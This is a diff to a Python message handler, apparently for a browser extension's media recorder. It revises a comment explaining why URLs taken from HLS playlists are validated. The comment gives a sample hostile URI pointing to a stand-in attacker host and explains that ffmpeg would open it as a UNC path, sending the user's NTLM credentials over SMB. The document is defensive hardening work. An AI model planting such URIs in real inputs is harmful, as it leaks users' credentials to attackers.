@@ -149,16 +149,21 @@ def handle_record(req):
     jid = req.get("id")
     # These two URLs are the only ones this host takes that no gated extension
     # path vetted. Every other lane's arrived from webRequest or a content
-    # script; these are URIs lifted from the BODY of a fetched HLS manifest,
-    # and media-catcher/lib/hls.js resolveUrl returns an absolute URI
-    # unchanged, so the playlist decides the string. recordLiveHls skips its
-    # findSiblingAudio probe when audioUrl is already set — which is exactly
-    # what an #EXT-X-MEDIA:TYPE=AUDIO line does — so a URI of
-    # "file://attacker.test/s/x" reaches ffmpeg, which opens it as the UNC
-    # path \\attacker.test\s\x: an outbound SMB connection carrying the user's
-    # NTLM credentials. That is the threat 2c3e0aa gated mirrors against, and
-    # this lane had no gate at all. audioUrl is optional, so only a present
-    # one is checked; videoUrl the schema already requires.
+    # script; these are URIs lifted from the BODY of a fetched HLS manifest.
+    # The live route is background.js "record-live" -> resolveVideoUrl, which
+    # fetches the master playlist and returns pickVariant(...).uri — and
+    # lib/hls.js resolveUrl returns an absolute URI unchanged, so the playlist
+    # decides the string. A variant URI of "file://attacker.test/s/x" reaches
+    # ffmpeg, which opens it as the UNC path \\attacker.test\s\x: an outbound
+    # SMB connection carrying the user's NTLM credentials. That is the threat
+    # 2c3e0aa gated mirrors against, and this lane had no gate at all.
+    #
+    # audioUrl is checked for the same reason, not because today's producer
+    # can reach it: findSiblingAudio only ever returns a same-stream-directory
+    # or token-swapped sibling of a URL that already passed, so it is pinned
+    # by construction rather than by test. The point is that the lane has a
+    # boundary. It stays optional, so only a present one is checked; videoUrl
+    # the schema already requires.
     for field in ("videoUrl", "audioUrl"):
         value = req.get(field)
         if field == "audioUrl" and not value:
